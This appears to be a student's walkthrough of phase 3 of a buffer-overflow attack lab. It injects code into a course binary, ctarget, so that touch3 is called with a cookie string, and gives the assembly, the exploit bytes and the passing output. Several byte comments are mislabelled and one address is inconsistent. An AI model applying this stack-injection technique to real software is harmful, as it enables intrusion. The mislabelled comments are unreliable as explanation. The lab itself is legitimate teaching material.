```c
00000000004018dc <touch3>:
  4018dc:	53                   	push   %rbx
  4018dd:	48 89 fb             	mov    %rdi,%rbx
  4018e0:	c7 05 12 3c 20 00 03 	movl   $0x3,0x203c12(%rip)        # 6054fc <vlevel>
  4018e7:	00 00 00 
  4018ea:	48 89 fe             	mov    %rdi,%rsi
  4018ed:	8b 3d 11 3c 20 00    	mov    0x203c11(%rip),%edi        # 605504 <cookie>
  4018f3:	e8 66 ff ff ff       	callq  40185e <hexmatch>
  4018f8:	85 c0                	test   %eax,%eax
  4018fa:	74 1e                	je     40191a <touch3+0x3e>
  4018fc:	48 89 de             	mov    %rbx,%rsi
  4018ff:	bf d8 30 40 00       	mov    $0x4030d8,%edi
  401904:	b8 00 00 00 00       	mov    $0x0,%eax
  401909:	e8 72 f3 ff ff       	callq  400c80 <printf@plt>
  40190e:	bf 03 00 00 00       	mov    $0x3,%edi
  401913:	e8 01 04 00 00       	callq  401d19 <validate>
  401918:	eb 1c                	jmp    401936 <touch3+0x5a>
  40191a:	48 89 de             	mov    %rbx,%rsi
  40191d:	bf 00 31 40 00       	mov    $0x403100,%edi
  401922:	b8 00 00 00 00       	mov    $0x0,%eax
  401927:	e8 54 f3 ff ff       	callq  400c80 <printf@plt>
  40192c:	bf 03 00 00 00       	mov    $0x3,%edi
  401931:	e8 95 04 00 00       	callq  401dcb <fail>
  401936:	bf 00 00 00 00       	mov    $0x0,%edi
  40193b:	e8 b0 f4 ff ff       	callq  400df0 <exit@plt>

```
The total bytes before the cookie are buffer + 8 bytes for return address of rsp + 8 bytes for touch3

$rsp + 0x28 (Size 0x18 + 8 + 8 = 0x28)
0x5567d538 + 0x28 = 0x5567D560

```c
emacs phase3.s
```
```c
mov $0x5567D560, %rdi
retq
```
```c
gcc -c phase3.s
```
```c
objdump -d phase3.o > phase3.d
```
```c
emacs phase3.d
```
```c
0000000000000000 <.text>:
   0:   48 c7 c7 60 d5 67 55    mov    $0x5567d560,%rdi
   7:   c3                      retq
```
My cookie  = 0x19195f9f but need to remove 0x

Convert Text to hex :
31 39 31 39 35 66 39 66 <= Becomes the last part in phase3.txt

```c
emacs phase3.txt
```

```c
48 c7 c7 60 d5 67 55 c3 /* address from 0x5567d548 + 0x28 */
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00 /* padding */
38 d5 67 55 00 00 00 00 /* address of touch3 from rtarget */
dc 18 40 00 00 00 00 00 /* address of register $rsp */ 
31 39 31 39 35 66 39 66 /* my cookie address */
```

```c
./hex2raw < phase3.txt > raw-phase3.txt
```
Just to see what hex2raw does to the bytes in phase3.txt we run
```c
emacs raw-phase3.txt
```
```c
H\307\307`\325gU\303^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@8\325gU^@^@^@^@\334\
^X@^@^@^@^@^@19195f9f
```
Save the file with <kbd>CTRL</kbd>+<kbd>x</kbd> then <kbd>CTRL</kbd>+<kbd>c</kbd> then <kbd>y</kbd>
```c
./ctarget < raw-phase3.txt
```
```c
Cookie: 0x19195f9f
Type string:Touch3!: You called touch3("19195f9f")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```